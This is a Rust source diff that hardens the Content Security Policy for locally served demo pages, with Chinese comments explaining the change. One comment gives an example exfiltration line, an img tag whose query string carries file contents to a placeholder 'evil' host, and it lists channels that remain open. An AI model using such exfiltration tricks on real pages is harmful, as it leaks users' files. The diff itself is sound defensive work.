@@ -46,18 +46,24 @@ const VENDOR: &[(&str, &str, &str)] = &[(
 /// 放宽的那部分：内联脚本、内联样式、https 上的库（`<script src="https://cdn…">` 与
 /// `import "https://…"` 都走 script-src）——这就是它的用途，收紧就没法做演示了。
 ///
-/// **刻意收紧的那一处是 `connect-src`**：页面不能 `fetch`/XHR/WebSocket 到外网。
-/// 因为「本地 .html 都会被当演示页跑起来」意味着用户**从别处下载来的**页面也会跑脚本——
-/// 那种页面只要和讲义放在同一个目录里，就能把 `./讲义.pdf` 读走再发出去。
-/// 只读自己目录 + 不许往外发，这条路的破坏力就和「打开一个静态网页」差不多。
+/// **刻意收紧的是「能把数据带出去」的那几条**：`connect-src`（fetch/XHR/WebSocket）、
+/// `img-src` / `media-src`（`<img src="https://evil/?d=内容">` 的查询串照样能把读到的
+/// 文件发出去——CSP 各指令独立生效，只收 connect-src 挡不住子资源加载）、
+/// `form-action`（GET 表单提交也是一条外发通道，且它**不**回落到 default-src）。
+/// 因为「本地 .html 都会被当演示页跑起来」意味着用户**从别处下载来的**页面也会跑
+/// 脚本——那种页面只要和讲义放在同一个目录里，就能把 `./讲义.pdf` 读走再发出去。
+/// 只读自己目录 + 这几条全部收死，外发的路就只剩「页面自己跳走」（top-level 导航
+/// 不归 CSP 管）和 script-src 的 CDN 白名单豁口——前者会明显换页、后者是「库要能
+/// 从 CDN 来」的既定代价（AGENTS.md 有记载），真要外传再没有静默的通道。
 /// （要联网取数据的演示页做不到：让 agent 先把数据抓下来写进页面目录。）
 const PAGE_CSP: &str = "default-src 'self' data: blob: https:; \
      script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https:; \
      style-src 'self' 'unsafe-inline' https:; \
-     img-src 'self' data: blob: https:; \
+     img-src 'self' data: blob:; \
      font-src 'self' data:; \
      connect-src 'self' data: blob:; \
-     media-src 'self' data: blob: https:; \
+     media-src 'self' data: blob:; \
+     form-action 'self'; \
      worker-src 'self' blob:";
 
 // ---------------------------------------------------------------- 通行证
